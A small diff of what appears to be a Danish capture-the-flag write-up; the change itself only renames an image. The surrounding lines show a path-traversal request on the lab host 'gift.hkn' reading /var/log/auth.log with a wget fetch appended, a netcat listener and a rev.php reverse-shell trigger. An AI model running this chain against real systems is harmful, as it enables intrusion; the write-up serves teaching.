@@ -102,7 +102,7 @@ http://gift.hkn:8000/?adminDebug=../../../../../var/log/auth.log&a=wget http://D
 
 herefter kan du trigger din reverse shell ved først at køre `nc -lvnp 1234` på din angriber maskine, og så gå til `gift.hkn/rev.php`
 
-![revshell](/assets/revshell.jpg)
+![revshell](/assets/revvy.jpg)
 
 
 ok så er vi på maskinen.
